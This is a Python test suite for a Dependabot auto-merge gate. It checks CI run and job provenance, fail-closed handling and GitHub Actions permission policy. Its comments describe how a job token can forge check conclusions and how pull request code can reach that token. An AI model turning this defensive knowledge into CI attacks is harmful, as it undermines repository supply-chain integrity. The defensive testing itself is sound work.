        # any github-actions check run of the commit, its own included. The
        # job record, its steps and the run are what the runner reported.
        name = "govulncheck"
        reason = f'required check "{name}" (CI) in Dependabot\'s run 45145297237 of .github/workflows/ci.yml (attempt 1): '
        for conclusion in ("failure", "cancelled", "skipped", "neutral", None):
            with self.subTest(job=conclusion):
                snapshot = green_gomod()
                job_for(snapshot, name)["conclusion"] = conclusion
                self.assert_holds(snapshot, reason + f"its job concluded {GATE._q(conclusion)}")
        for step in ("failure", "cancelled", "neutral", None, "something-new"):
            with self.subTest(step=step):
                snapshot = green_gomod()
                job_for(snapshot, name)["steps"][3] = step
                self.assert_holds(snapshot, reason + f"a step of its job concluded {GATE._q(step)}")
        snapshot = green_gomod()
        job_for(snapshot, name)["steps"] = ["skipped"] * 4
        self.assert_merges(snapshot)
        for conclusion in ("failure", "cancelled", "skipped", None):
            with self.subTest(run=conclusion):
                snapshot = green_gomod()
                workflow_run(snapshot, "CI")["conclusion"] = conclusion
                self.assert_holds(snapshot, f"Dependabot's run 45145297237 of .github/workflows/ci.yml, behind required checks, concluded {GATE._q(conclusion)}")
        # The check run's own conclusion and status, and its commit.
        for status, conclusion in (("completed", "failure"), ("completed", "skipped"), ("in_progress", None)):
            with self.subTest(status=status, conclusion=conclusion):
                snapshot = green_gomod()
                suite_check(snapshot, name).update(status=status, conclusion=conclusion)
                self.assert_holds(snapshot, reason + f"its check run concluded {GATE._q(conclusion)} (status {GATE._q(status)})")
        snapshot = green_gomod()
        suite_check(snapshot, name)["head_sha"] = "0" * 40
        self.assert_holds(snapshot, reason + "its check run is not for the pull request head")

    def test_patched_check_conclusion_is_not_enough(self) -> None:
        # #190 as it was: govulncheck failed. A check run PATCHed to success,
        # in the listing and in the suite, leaves the job and the step.
        snapshot = real(190)
        snapshot["compare"]["behind_by"] = 0
        failed = [check for check in snapshot["check_runs"] if check["conclusion"] == "failure"]
        for check in failed + [check for run in snapshot["workflow_runs"] for check in run.get("check_runs", [])]:
            check["conclusion"] = "success"
        for run in snapshot["workflow_runs"]:
            run["conclusion"] = "success"
        verdict = GATE.decide(snapshot)
        self.assertEqual(verdict["decision"], "hold")
        for name in ("govulncheck", "Test (macos)", "normalized golangci-lint gates"):
            self.assertTrue(any(f'required check "{name}"' in reason and "its job concluded \"failure\"" in reason for reason in verdict["reasons"]), name)

    def test_only_the_latest_attempt_is_bound(self) -> None:
        # A re-run gives every job of the new attempt a new id, in the same
        # check suite; `filter=latest` lists the new ids (PR #197 review).
        name = "Test (macos)"
        snapshot = green_gomod()
        run = rerun(snapshot, "CI")
        failed = [job for job in run["jobs"] if job["run_attempt"] == 1 and job["id"] == run_named(snapshot, name)["id"] - RERUN]
        failed[0].update(conclusion="failure", steps=["success", "failure"])
        self.assert_merges(snapshot)
        # The earlier attempt bound instead of the latest: its ids are not in the listing.
        snapshot = green_gomod()
        rerun(snapshot, "CI")
        workflow_run(snapshot, "CI")["run_attempt"] = 1
        self.assert_holds(snapshot, "a job of that name has the attempt 2, not one of the run's", only=False)
        # A job of an attempt the run does not have.
        snapshot = green_gomod()
        job_for(snapshot, name)["run_attempt"] = 2
        self.assert_holds(snapshot, "a job of that name has the attempt 2, not one of the run's")
        for attempt in (None, "1", True):
            with self.subTest(attempt=attempt):
                snapshot = green_gomod()
                job_for(snapshot, name)["run_attempt"] = attempt
                self.assert_holds(snapshot, f"a job of that name has the attempt {GATE._q(attempt)}, not one of the run's")
        # The latest attempt failed: the earlier success does not count.
        snapshot = green_gomod()
        run = rerun(snapshot, "CI")
        (latest,) = [job for job in run["jobs"] if job["id"] == run_named(snapshot, name)["id"]]
        latest["conclusion"] = "failure"
        self.assert_holds(snapshot, 'its job concluded "failure"')

    def test_unreadable_runs_hold(self) -> None:
        snapshot = green_gomod()
        snapshot["workflow_runs"] = None
        self.assert_holds(snapshot, "the workflow runs could not be read", "dependabot[bot] started no pull_request run", only=False)
        for field, value in (
            ("check_suite_id", "1"),
            ("check_suite_id", True),
            ("id", None),
            ("id", "45145297215"),
            ("id", True),
            ("path", None),
            ("event", None),
            ("actor", None),
            ("actor", {"id": "49699333"}),
            ("actor", {"id": True}),
            ("run_attempt", None),
            ("run_attempt", "1"),
            ("repository", None),
            ("repository", {"id": None}),
            ("repository", {"id": "1130617195"}),
            ("head_repository", None),
            ("head_repository", {}),
            ("head_repository", {"id": "1130617195"}),
            ("head_repository", {"id": True}),
        ):
            with self.subTest(field=field, value=value):
                snapshot = green_gomod()
                workflow_run(snapshot, "Lint")[field] = value
                self.assert_holds(snapshot, "a workflow run of the head commit could not be read", only=False)
        snapshot = green_gomod()
        del workflow_run(snapshot, "Lint")["conclusion"]
        self.assert_holds(snapshot, "a workflow run of the head commit could not be read", only=False)

    def test_run_of_another_commit_holds(self) -> None:
        snapshot = green_gomod()
        workflow_run(snapshot, "CI")["head_sha"] = "0" * 40
        self.assert_holds(snapshot, 'the workflow run of ".github/workflows/ci.yml" is not for the pull request head', "dependabot[bot] started no", only=False)

    def test_unreadable_jobs_hold(self) -> None:
        reason = (
            'required check "Models, golden vectors, and correspondence" (Formal Verification) in Dependabot\'s run 45145297322 of '
            ".github/workflows/formal-verification.yml (attempt 1): the jobs or the check runs of that run could not be read"
        )
        for key in ("jobs", "check_runs"):
            for value in (None, {}, "x"):
                with self.subTest(key=key, value=value):
                    snapshot = green_gomod()
                    workflow_run(snapshot, "Formal Verification")[key] = value
                    self.assert_holds(snapshot, reason)
            snapshot = green_gomod()
            del workflow_run(snapshot, "CI")[key]
            verdict = self.assert_holds(snapshot, "the jobs or the check runs of that run could not be read", only=False)
            self.assertEqual(len(verdict["reasons"]), len([check for check in GATE.REQUIRED_GOMOD if check.workflow == "CI"]))
        snapshot = green_gomod()
        workflow_run(snapshot, "CI")["jobs"] = []
        verdict = self.assert_holds(snapshot, "0 of its jobs have the id of a check of that name", only=False)
        self.assertEqual(len(verdict["reasons"]), len([check for check in GATE.REQUIRED_GOMOD if check.workflow == "CI"]))

    def test_real_required_checks_are_jobs_that_ran_on_a_runner(self) -> None:
        for number, required in ((190, GATE.REQUIRED_GOMOD), (189, GATE.REQUIRED_NPM), (191, GATE.REQUIRED_NPM)):
            snapshot = real(number)
            runs = GATE._head_runs(GATE.Context(snapshot), snapshot["head_sha"])
            for check in required:
                if check.app != GATE.ACTIONS_APP:
                    continue
                with self.subTest(pr=number, check=check.name):
                    run = GATE._bound_run(runs, GATE.WORKFLOW_FILES[check.workflow])
                    pairs, problem = GATE._latest_attempt_checks(run, check.name)
                    self.assertEqual((len(pairs), problem), (1, None))
                    self.assertEqual(pairs[0][0]["id"], run_named(snapshot, check.name)["id"])

    def test_real_api_created_checks_are_listed_as_jobs_without_a_runner(self) -> None:
        # What GitHub returned for #190 and #191: the checks ci.yml's test
        # job created through the API (mikepenz/action-junit-report) are
        # among the jobs and the suite check runs of another workflow's run.
        # The listings alone therefore prove nothing; the runner and the steps do.
        for number, workflow in ((190, "Lint"), (191, "CodeQL")):
            with self.subTest(pr=number):
                snapshot = real(number)
                run = workflow_run(snapshot, workflow)
                junit = [check for check in snapshot["check_runs"] if check["name"].startswith("JUnit Report (")]
                self.assertEqual(len(junit), 4)
                ghosts = [job for job in run["jobs"] if job["id"] in {check["id"] for check in junit}]
                self.assertEqual([(job["runner_id"], job["steps"]) for job in ghosts], [(None, [])] * 4)
                self.assertEqual({check["check_suite"]["id"] for check in junit}, {run["check_suite_id"]})
                self.assertEqual({check["id"] for check in run["check_runs"]}, {job["id"] for job in run["jobs"]})
                for job in ghosts:
                    self.assertFalse(GATE._ran_on_a_runner(job))
                real_jobs = [job for job in run["jobs"] if job not in ghosts]
                self.assertTrue(all(GATE._ran_on_a_runner(job) for job in real_jobs), real_jobs)
        # Only the runs a required check can come from carry jobs and check runs.
        for number in (189, 190, 191):
            for run in real(number)["workflow_runs"]:
                self.assertEqual("jobs" in run, run["path"] in GATE.REQUIRED_WORKFLOW_PATHS, run["path"])
                self.assertEqual("check_runs" in run, run["path"] in GATE.REQUIRED_WORKFLOW_PATHS, run["path"])

    def test_checks_of_other_apps_and_other_checks_are_not_bound_to_a_run(self) -> None:
        # The code-scanning results and the Socket and SonarCloud checks have
        # no workflow run; an action's own check run (JUnit Report) lands in
        # whichever suite GitHub picks. None of them is judged here.
        snapshot = green_gomod()
        for name in ("CodeQL", "SonarCloud", "SonarCloud Code Analysis", "Socket Security: Pull Request Alerts", "JUnit Report (macos)"):
            run_named(snapshot, name)["check_suite"]["id"] = 1
            run_named(snapshot, name)["id"] += 1
        self.assert_merges(snapshot)
        # A run nobody requires may be anyone's.
        workflow_run_of_benchmarks = [run for run in snapshot["workflow_runs"] if run["path"] == ".github/workflows/benchmarks.yml"]
        self.assertEqual(len(workflow_run_of_benchmarks), 1)
        workflow_run_of_benchmarks[0].update(actor={"id": 1}, event="workflow_dispatch", conclusion="failure")
        self.assert_merges(snapshot)


class FailClosedTests(GateTestCase):
    def test_non_object_snapshots_hold(self) -> None:
        for snapshot in (None, [], "merge", 1):
            with self.subTest(snapshot=snapshot):
                self.assert_holds(snapshot, "the snapshot is not a JSON object", only=False)

    def test_every_missing_field_holds(self) -> None:
        def paths(value: object, prefix: tuple = ()) -> list[tuple]:
            found = []
            if isinstance(value, dict):
                for key, child in value.items():
                    found.append(prefix + (key,))
                    found.extend(paths(child, prefix + (key,)))
            elif isinstance(value, list) and value:
                found.extend(paths(value[0], prefix + (0,)))
            return found

        # `verification.reason` is kept in the snapshot for the reader only.
        unread = {("commits", 0, "commit", "verification", "reason")}
        for green in (green_gomod, green_npm):
            for path in paths(green()):
                if path in unread:
                    continue
                with self.subTest(ecosystem=green.__name__, removed=path):
                    snapshot = green()
                    parent = snapshot
                    for key in path[:-1]:
                        parent = parent[key]
                    del parent[path[-1]]
                    self.assert_holds(snapshot, only=False)

    def test_a_rule_that_raises_holds(self) -> None:
        def broken(ctx: object) -> None:
            raise RuntimeError("boom <script>")

        with mock.patch.object(GATE, "RULES", GATE.RULES + (broken,)):
            self.assert_holds(green_gomod(), 'broken could not be evaluated (RuntimeError: "boom <script>")')

    def test_every_rule_is_registered(self) -> None:
        rules = sorted(name for name in vars(GATE) if name.startswith("rule_"))
        self.assertEqual(rules, sorted(rule.__name__ for rule in GATE.RULES))
        self.assertEqual(len(rules), 11)

    def test_script_lines_fit_in_140_columns(self) -> None:
        # Finding N6 of the PR #197 review: scripts/ is outside SonarCloud's
        # sources, so nothing else holds the script to the repository's width.
        lines = (HERE / "dependabot-gate.py").read_text(encoding="utf-8").splitlines()
        self.assertEqual([number for number, line in enumerate(lines, 1) if len(line) > 140], [])

    def test_no_merge_without_an_ecosystem_and_dependencies(self) -> None:
        with mock.patch.object(GATE, "RULES", ()):
            self.assert_holds(green_gomod(), "no ecosystem or no dependency was established")


# ----------------------------------------------------------- policy tables


def workflow_docs() -> dict[str, dict]:
    docs = {}
    for path in sorted(WORKFLOWS.glob("*.yml")):
        doc = load_yaml(path.read_text(encoding="utf-8"))
        docs[doc["name"]] = doc
    return docs


def glob_matches(pattern: str, path: str) -> bool:
    """GitHub's path filter: `**` crosses directories, `*` does not."""
    regex = "".join(".*" if part == "**" else "[^/]*" if part == "*" else re.escape(part) for part in re.split(r"(\*\*|\*)", pattern))
    return re.fullmatch(regex, path) is not None


def name_matches(template: str, name: str) -> bool:
    """A job `name:` with `${{ }}` expressions against one check name."""
    regex = ".*".join(re.escape(part) for part in re.split(r"\$\{\{.*?\}\}", template))
    return re.fullmatch(regex, name) is not None


class PolicyTableTests(unittest.TestCase):
    def test_deny_list_entries_are_still_dependencies(self) -> None:
        go_mod = (ROOT / "go.mod").read_text(encoding="utf-8")
        for name in GATE.DENY_GOMOD:
            with self.subTest(name=name):
                self.assertRegex(go_mod, rf"(?m)^\t{re.escape(name)} v\S+", "stale DENY_GOMOD entry: not required in go.mod")
        package = json.loads((ROOT / "website" / "package.json").read_text(encoding="utf-8"))
        dependencies = {**package["dependencies"], **package["devDependencies"]}
        for name in GATE.DENY_NPM:
            with self.subTest(name=name):
                self.assertIn(name, dependencies, "stale DENY_NPM entry: not in website/package.json")

    def test_every_exact_npm_pin_is_deny_listed(self) -> None:
        # version-pinning.md: "Core Docusaurus packages use exact versions".
        package = json.loads((ROOT / "website" / "package.json").read_text(encoding="utf-8"))
        dependencies = {**package["dependencies"], **package["devDependencies"]}
        exact = {name for name, version in dependencies.items() if re.fullmatch(r"\d+\.\d+\.\d+", version)}
        self.assertEqual(exact, set(GATE.DENY_NPM))

    def test_stale_deny_entry_is_detected(self) -> None:
        go_mod = (ROOT / "go.mod").read_text(encoding="utf-8")
        self.assertNotRegex(go_mod, r"(?m)^\tgithub\.com/invowk/no-such-module v\S+")

    def test_relaxation_tables_are_pinned(self) -> None:
        # Widening a relaxation is a policy change: it must show up here.
        self.assertEqual(sorted(GATE.ALLOW_0X_MINOR), ["golang.org/x/"])
        self.assertEqual((GATE.RULE_INDIRECT, GATE.RULE_0X_MINOR), ("indirect-side-effect", "allow-0x-minor"))
        requirements = GATE.parse_go_mod((ROOT / "go.mod").read_text(encoding="utf-8"))[0]
        for prefix, reason in GATE.ALLOW_0X_MINOR.items():
            with self.subTest(prefix=prefix):
                self.assertTrue(prefix.endswith("/"), "a prefix without a trailing slash also matches other paths")
                self.assertGreater(len(reason), 40)
                under = sorted(module for module in requirements if module.startswith(prefix))
                self.assertTrue(under, "stale ALLOW_0X_MINOR entry: go.mod requires nothing under it")
                # Today every released one is a 0.x version, which is the reason for the entry.
                released = [module for module in under if GATE.VERSION_RE.fullmatch(requirements[module][0])]
                self.assertTrue(released and all(requirements[module][0].startswith("v0.") for module in released), released)
        gomod = GATE.ECOSYSTEMS[0]
        admitted = {module for module in requirements if GATE._allows_0x_minor(gomod, module)}
        self.assertEqual({module for module in requirements if module.startswith("golang.org/x/")} - admitted, {"golang.org/x/tools"})
        self.assertIn("golang.org/x/tools", GATE.DENY_GOMOD)

    def test_ecosystem_files_exist(self) -> None:
        for eco in GATE.ECOSYSTEMS:
            self.assertIn(eco.manifest, eco.files)
            for filename in eco.files:
                self.assertTrue((ROOT / filename).is_file(), filename)

    def test_required_sets_are_pinned(self) -> None:
        # Dropping a required check is a policy change: it must show up here.
        every_pr = {
            ("Socket Security: Pull Request Alerts", "Socket Security"),
            ("SonarCloud Code Analysis", "SonarCloud"),
            ("SonarCloud", "SonarCloud"),
            ("normalized golangci-lint gates", "Lint"),
            ("goplint consumer gates", "Lint"),
            ("script tests (worktree-safety gate)", "Lint"),
            ("file length gate (1000 lines)", "Lint"),
            ("agent docs integrity", "Lint"),
            ("Models, golden vectors, and correspondence", "Formal Verification"),
            ("Analyze (actions)", "CodeQL"),
            ("Analyze (go)", "CodeQL"),
            ("Analyze (javascript-typescript)", "CodeQL"),
            ("Analyze (python)", "CodeQL"),
            ("CodeQL", "CodeQL"),
        }
        ci = {
            "Test (ubuntu-latest / docker)",
            "Test (ubuntu-latest / podman)",
            "Test (windows)",
            "Test (macos)",
            "Build (linux/amd64)",
            "Build (linux/arm64)",
            "Build (darwin/amd64)",
            "Build (darwin/arm64)",
            "Build (windows/amd64)",
            "License Headers",
            "govulncheck",
            "PGO Sanity",
            "GoReleaser Check",
            "Release Dry Run",
        }
        expected = {
            "gomod": every_pr | {(name, "CI") for name in ci},
            "npm": every_pr | {("test-build", "Test Website Build")},
        }
        for eco in GATE.ECOSYSTEMS:
            with self.subTest(ecosystem=eco.name):
                self.assertEqual({(check.name, check.workflow) for check in eco.required}, expected[eco.name])
                apps = {check.name: check.app for check in eco.required}
                self.assertEqual(apps.pop("CodeQL"), "github-advanced-security")
                self.assertEqual(apps.pop("SonarCloud"), "github-advanced-security")
                self.assertEqual(apps.pop("SonarCloud Code Analysis"), "sonarqubecloud")
                self.assertEqual(apps.pop("Socket Security: Pull Request Alerts"), "socket-security")
                self.assertEqual(set(apps.values()), {"github-actions"})
                for check in eco.required:
                    self.assertEqual(check.workflow in GATE.WORKFLOW_FILES, check not in GATE.REQUIRED_EXTERNAL, check.name)

    def test_workflow_files_are_the_named_workflows(self) -> None:
        # rule_check_provenance compares a run's `path` with these.
        for name, path in GATE.WORKFLOW_FILES.items():
            with self.subTest(workflow=name):
                self.assertEqual(load_yaml((ROOT / path).read_text(encoding="utf-8"))["name"], name)
        self.assertEqual(len(set(GATE.WORKFLOW_FILES.values())), len(GATE.WORKFLOW_FILES))
        for number in (189, 190, 191):
            paths = {run["path"] for run in real(number)["workflow_runs"]}
            self.assertLessEqual(paths - {".github/workflows/benchmarks.yml"}, set(GATE.WORKFLOW_FILES.values()))

    def test_required_checks_ran_on_the_real_pull_requests(self) -> None:
        for number, required in ((190, GATE.REQUIRED_GOMOD), (189, GATE.REQUIRED_NPM)):
            ran = {(run["name"], run["app"]["slug"]) for run in real(number)["check_runs"]}
            for check in required:
                with self.subTest(pr=number, check=check.name):
                    self.assertIn((check.name, check.app), ran)

    def test_required_checks_match_the_workflow_files(self) -> None:
        docs = workflow_docs()
        for eco in GATE.ECOSYSTEMS:
            for check in eco.required:
                if check in GATE.REQUIRED_EXTERNAL:
                    continue  # no workflow file reports it
                with self.subTest(ecosystem=eco.name, check=check.name):
                    doc = docs[check.workflow]
                    trigger = doc["on"]["pull_request"]
                    self.assertNotIn("paths-ignore", trigger)
                    self.assertIn("main", trigger.get("branches", ["main"]))
                    for filename in eco.files:
                        self.assertTrue(
                            "paths" not in trigger or any(glob_matches(pattern, filename) for pattern in trigger["paths"]),
                            f"{check.workflow} does not start for {filename}",
                        )
                    if check.app != GATE.ACTIONS_APP:
                        continue
                    jobs = [
                        job
                        for job_id, job in doc["jobs"].items()
                        if name_matches(job.get("name", job_id), check.name)
                    ]
                    self.assertEqual(len(jobs), 1, f"no single job of {check.workflow} is named {check.name!r}")
                    self.assertNotIn("if", jobs[0], "a conditional job can be skipped: it cannot be required")

    # Finding B1 of the PR #197 review, generalised. A job token with
    # `checks: write` can create a check with any name and PATCH the
    # conclusion of any github-actions check run of the commit; `contents:
    # write` can push, `pull-requests: write` can edit and approve,
    # `id-token: write` can mint an OIDC token for this repository, and so on.
    # Keeping the token out of .git/config (`persist-credentials: false`) is
    # hygiene, not the control: code a job runs can still reach it (the
    # runner user may rewrite the actions under `_actions/`, a post step gets
    # the token as an input, and hosted runners have passwordless sudo). The
    # control is that no job that runs pull request code holds a write grant
    # of any scope.
    #
    # The events whose runs a pull request's author can cause with code the
    # pull request chose. push, schedule, release and workflow_dispatch run
    # only main's or a tag's code here (every push trigger is limited to main
    # or to tags: test_push_triggers_run_only_main_or_tags).
    PR_EVENTS = frozenset({"pull_request", "pull_request_target", "workflow_run", "pull_request_review", "pull_request_review_comment", "issue_comment", "merge_group"})
    # The jobs that hold a write grant and may run pull request code by the
    # rule below (a checkout or a `run` step), with the grants they hold and
    # why the token does not reach pull request code. Each reason is asserted
    # in test_writers_that_check_out_pull_request_code_keep_their_evidence or
    # test_pgo_profile_commit_runs_no_pull_request_code.
    WRITER_EXEMPTIONS = {
        ("benchmarks.yml", "bencher"): (
            frozenset({"checks", "pull-requests"}),
            "Track Benchmarks runs only for a pull request from a branch of this repository (people with write access, "
            "or Dependabot, which changes no script) that carries the `benchmarks: run` label, which only a maintainer adds. "
            "The dependency code is read only inside `docker build`, whose context leaves out .git (where the persisted token is); "
            "the benchmarks run on Bencher's machine, not on the runner, and the token goes to the pinned bencher CLI only.",
        ),
        ("benchmarks-upload.yml", "upload-fork-pr"): (
            frozenset({"checks", "pull-requests"}),
            "Benchmark Upload checks the fork's head out into source/ and reads it only as the context of `docker build`, "
            "with the trusted Dockerfile and the trusted .dockerignore copied over the fork's; every script it sources is "
            "from the trusted checkout of main.",
        ),
        ("ci.yml", "pgo-commit"): (
            frozenset({"contents"}),
            "PGO Profile Commit has no checkout: it downloads the profile PGO Sanity regenerated, checks that the artifact is "
            "one regular gzip file named default.pgo, and commits that one path to the pull request's own branch through the "
            "GraphQL API. Its `run` steps are inline shell that calls no make, go, script or git; PGO Sanity, which runs the "
            "pull request's code, holds `contents: read` only.",
        ),
    }
    # Write grants in jobs that run pull request code, found when the rule
    # was generalised and left to the maintainer: the workflows are unchanged
    # and each grant is needed by an action of the job, but nothing here
    # shows the token stays out of reach of the code the job runs.
    WRITERS_AWAITING_MAINTAINER = {
        ("ci.yml", "release-dry-run"): (
            frozenset({"id-token"}),
            "Release Dry Run builds the pull request's code with GoReleaser and holds `id-token: write`, for keyless Cosign "
            "signing on push and release runs; on pull_request runs it passes --skip=sign, so the grant is unused there.",
        ),
        ("claude.yml", "claude"): (
            frozenset({"id-token"}),
            "Claude Code checks out the event's ref (a pull request's merge ref on review events) and runs "
            "anthropics/claude-code-action, which exchanges the OIDC token for its App token.",
        ),
        ("codeql.yml", "analyze"): (
            frozenset({"security-events"}),
            "Analyze (go) builds the pull request's code (autobuild) and holds `security-events: write`, which the analyze "
            "step needs to upload its results.",
        ),
    }
    @staticmethod
    def triggers(doc: dict) -> set[str]:
        on = doc.get("on")
        if isinstance(on, str):
            return {on}
        return set(on) if isinstance(on, (dict, list)) else set()

    PERMISSION_LEVELS = frozenset({"read", "write", "none"})

    @classmethod
    def permissions_value(cls, value: object, where: str = "permissions") -> dict[str, str] | str | None:
        """A `permissions` value as a mapping of scope to level, `read-all`, `write-all` or None (absent).

        Flow mappings (`{checks: write}`, `{}`) come back from load_yaml as their text and are parsed here; a
        value this cannot read fails, so a grant is never skipped.
        """
        if value is None:
            return None
        if isinstance(value, dict):
            levels = {str(scope): str(level) for scope, level in value.items()}
        elif isinstance(value, str) and value.strip().startswith("{"):
            text = value.strip()
            if not text.endswith("}") or any(ch in text[1:-1] for ch in "{}[]"):
                raise ValueError(f"{where}: unreadable flow mapping {value!r}")
            levels = {}
            for item in filter(None, (part.strip() for part in text[1:-1].split(","))):
                scope, colon, level = item.partition(":")
                if not colon:
                    raise ValueError(f"{where}: unreadable flow entry {item!r}")
                levels[scope.strip().strip("'\"")] = level.strip().strip("'\"")
        elif value in ("read-all", "write-all"):
            return value
        else:
            raise ValueError(f"{where}: unreadable permissions {value!r}")
        for scope, level in levels.items():
            if not scope or level not in cls.PERMISSION_LEVELS:
                raise ValueError(f"{where}: unreadable grant {scope!r}: {level!r}")
        return levels

    @classmethod
    def write_grants(cls, doc: dict, job: dict) -> frozenset[str]:
        """The scopes a job's token may write, `write-all` for all of them.

        A job's `permissions` replace the workflow's. With neither, the repository default applies: `read`
        (`default_workflow_permissions`, read with GET repos/invowk/invowk/actions/permissions/workflow on 2026-11-24).
        """
        raw = job["permissions"] if "permissions" in job else doc.get("permissions")
        permissions = cls.permissions_value(raw)
        if permissions is None or permissions == "read-all":
            return frozenset()
        if permissions == "write-all":
            return frozenset({"write-all"})
        return frozenset(scope for scope, level in permissions.items() if level == "write")

    @classmethod
    def may_write_checks(cls, doc: dict, job: dict) -> bool:
        return bool(cls.write_grants(doc, job) & {"checks", "write-all"})

    @staticmethod
    def runs_pull_request_code(job: dict) -> bool:
        """Any checkout, any `run` step, any local action and any reusable workflow may run the pull request's code."""
        if "uses" in job:
            return True
        return any(
            "run" in step or str(step.get("uses", "")).startswith(("actions/checkout@", "./", ".\\")) for step in job.get("steps", [])
        )

    def workflow_files(self) -> dict[str, dict]:
        return {path.name: load_yaml(path.read_text(encoding="utf-8")) for path in sorted(WORKFLOWS.glob("*.y*ml"))}

    def test_every_pull_request_job_declares_permissions(self) -> None:
        # write_grants falls back to the repository default (read) only for a job with no permissions at
        # either level; requiring a declaration keeps the guard independent of that repository setting.
        for filename, doc in self.workflow_files().items():
            if not self.triggers(doc) & self.PR_EVENTS or "permissions" in doc:
                continue
            for job_id, job in doc["jobs"].items():
                with self.subTest(workflow=filename, job=job_id):
                    self.assertIn("permissions", job, "a job a pull request can start declares its permissions")

    def test_no_job_that_runs_pull_request_code_may_write(self) -> None:
        known = {**self.WRITER_EXEMPTIONS, **self.WRITERS_AWAITING_MAINTAINER}
        self.assertFalse(set(self.WRITER_EXEMPTIONS) & set(self.WRITERS_AWAITING_MAINTAINER))
        exempted, writers = [], {}
        for filename, doc in self.workflow_files().items():
            self.permissions_value(doc.get("permissions"), f"{filename}: permissions")
            if not self.triggers(doc) & self.PR_EVENTS:
                continue
            for job_id, job in doc["jobs"].items():
                grants = self.write_grants(doc, job)
                if not grants:
                    continue
                writers[(filename, job_id)] = grants
                if not self.runs_pull_request_code(job):
                    continue
                with self.subTest(workflow=filename, job=job_id):
                    self.assertIn((filename, job_id), known, f"a job that runs pull request code may write {sorted(grants)}")
                    # An exemption covers the grants it names, not a new one.
                    self.assertEqual(grants, known[(filename, job_id)][0])
                    exempted.append((filename, job_id))
        # Every exemption is still needed: a job that stops writing loses it.
        self.assertEqual(sorted(exempted), sorted(known))
        self.assertEqual(writers, {**{key: grants for key, (grants, _) in known.items()}, ("ci.yml", "test-report"): frozenset({"checks"})})
        for key, (_, reason) in known.items():
            with self.subTest(exemption=key):
                self.assertGreater(len(reason), 80)

    def test_the_writer_rule_sees_each_grant(self) -> None:
        job = {"steps": [{"uses": "actions/checkout@v7"}, {"run": "go test ./..."}]}
        for doc, job_permissions, grants in (
            ({}, {"checks": "write"}, {"checks"}),
            ({}, {"contents": "write", "id-token": "write", "actions": "read"}, {"contents", "id-token"}),
            ({}, "write-all", {"write-all"}),
            ({"permissions": {"checks": "write"}}, None, {"checks"}),
            ({"permissions": "write-all"}, None, {"write-all"}),
            ({"permissions": {"checks": "write"}}, {"contents": "read"}, set()),  # the job's replace the workflow's
            ({"permissions": "write-all"}, {}, set()),
            ({}, None, set()),  # the repository default, read
            ({}, {"checks": "read", "statuses": "none"}, set()),
            ({}, "read-all", set()),
        ):
            with self.subTest(workflow=doc, job=job_permissions):
                full = dict(job) if job_permissions is None else dict(job, permissions=job_permissions)
                self.assertEqual(self.write_grants(doc, full), grants)
                self.assertEqual(self.may_write_checks(doc, full), bool(grants & {"checks", "write-all"}))
        # The forms load_yaml keeps as text are read, not skipped.
        for text, grants in (
            ("permissions: {checks: write}\n", {"checks"}),
            ("permissions: { contents: read, 'id-token': \"write\" }\n", {"id-token"}),
            ("permissions: {security-events: write, pull-requests: write}\n", {"security-events", "pull-requests"}),
            ("permissions: {}\n", set()),
            ("permissions: write-all\n", {"write-all"}),
            ("permissions: 'write-all'\n", {"write-all"}),
            ("permissions: read-all\n", set()),
            ("permissions:\n  packages: write\n  deployments: write\n", {"packages", "deployments"}),
        ):
            with self.subTest(text=text):
                doc = load_yaml(text)
                self.assertEqual(self.write_grants(doc, dict(job)), grants)
                self.assertEqual(self.write_grants({}, dict(job, permissions=doc["permissions"])), grants)
        for text in (
            "permissions:\n",
            "permissions: write\n",
            "permissions: {checks}\n",
            "permissions: {checks: admin}\n",
            "permissions: {checks: {nested: write}}\n",
            "permissions: [checks]\n",
            "permissions: {checks: write\n",
        ):
            with self.subTest(text=text), self.assertRaises(ValueError):
                self.write_grants(load_yaml(text), dict(job))
        for steps, runs in (
            ([{"uses": "actions/download-artifact@v8"}, {"uses": "mikepenz/action-junit-report@v6"}], False),
            ([{"uses": "actions/checkout@v7", "with": {"ref": "main"}}], True),
            ([{"run": "echo hi"}], True),
            ([{"uses": "./.github/actions/local"}], True),
        ):
            with self.subTest(steps=steps):
                self.assertEqual(self.runs_pull_request_code({"steps": steps}), runs)
        self.assertTrue(self.runs_pull_request_code({"uses": "./.github/workflows/reusable.yml"}))
        self.assertEqual(self.triggers({"on": "pull_request"}), {"pull_request"})
        self.assertEqual(self.triggers({"on": ["push", "pull_request"]}), {"push", "pull_request"})

    def test_push_triggers_run_only_main_or_tags(self) -> None:
        for filename, doc in self.workflow_files().items():
            on = doc.get("on")
            if not isinstance(on, dict) or "push" not in on:
                continue
            with self.subTest(workflow=filename):
                push = on["push"] or {}
                self.assertTrue(push.get("branches") == ["main"] or ("tags" in push and "branches" not in push), push)

    def test_writers_that_check_out_pull_request_code_keep_their_evidence(self) -> None:
        files = self.workflow_files()
        shell = re.compile(r"^\s*(?:go|npm|npx|node|make|yarn|pnpm|python3?|bash|sh)\b", re.MULTILINE)
        dockerignore = (ROOT / ".dockerignore").read_text(encoding="utf-8").splitlines()
        self.assertIn(".git", dockerignore)
        self.assertIn("COPY . .", (ROOT / "build" / "bencher" / "Dockerfile").read_text(encoding="utf-8"))
        # benchmarks.yml: same-repository pull requests with the label only; PR code only in `docker build`.
        job = files["benchmarks.yml"]["jobs"]["bencher"]
        condition = " ".join(job["if"].split())
        self.assertIn("github.event.pull_request.head.repo.full_name == github.repository", condition)
        self.assertIn("contains(github.event.pull_request.labels.*.name, 'benchmarks: run')", condition)
        self.assertTrue(condition.startswith("github.event_name != 'pull_request' || (github.event.pull_request.head.repo.full_name"), condition)
        runs = [step["run"] for step in job["steps"] if "run" in step]
        self.assertEqual([line.strip() for text in runs for line in text.splitlines() if "docker" in line], [
            'docker build --platform linux/amd64 -f build/bencher/Dockerfile -t "$image" .'
        ])
        for text in runs:
            self.assertIsNone(shell.search(text), text)
            for path in re.findall(r"^\s*source (\S+)", text, re.MULTILINE):
                self.assertTrue(path.startswith("scripts/bencher-"), path)
        uses = sorted(str(step.get("uses")) for step in job["steps"] if "uses" in step)
        self.assertEqual(uses, ["actions/checkout@v7", "bencherdev/bencher@v0.6.12"])
        # benchmarks-upload.yml: the fork's code is the build context only, with the trusted files.
        job = files["benchmarks-upload.yml"]["jobs"]["upload-fork-pr"]
        checkouts = [step.get("with", {}) for step in job["steps"] if str(step.get("uses", "")).startswith("actions/checkout@")]
        self.assertEqual(checkouts[0], {"path": "trusted"})
        self.assertEqual(checkouts[1]["path"], "source")
        build = next(step["run"] for step in job["steps"] if "docker build" in step.get("run", ""))
        lines = [line.strip() for line in build.splitlines()]
